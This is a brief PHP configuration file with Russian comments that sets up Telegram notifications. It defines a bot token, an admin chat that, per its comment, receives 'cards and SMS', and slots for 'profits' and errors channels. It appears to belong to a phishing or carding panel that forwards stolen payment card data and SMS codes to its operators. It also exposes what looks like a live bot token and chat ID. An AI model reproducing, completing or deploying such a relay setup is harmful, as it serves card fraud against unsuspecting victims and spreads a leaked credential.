<?

// Уведомления в телеграмм канал
define("tgToken", "6732252623:AAENdaIiONPb_2wnBXIGcjWmhrvplgCNAuA"); // токен ТГ

define("chatAdmin", "-1002089834481"); // ID чата админов(приходят карты и смс)

define("chatProfits", "тут id"); // ID канала профитов

define("chatErrors", "тут id"); // ID канала ошибок

?>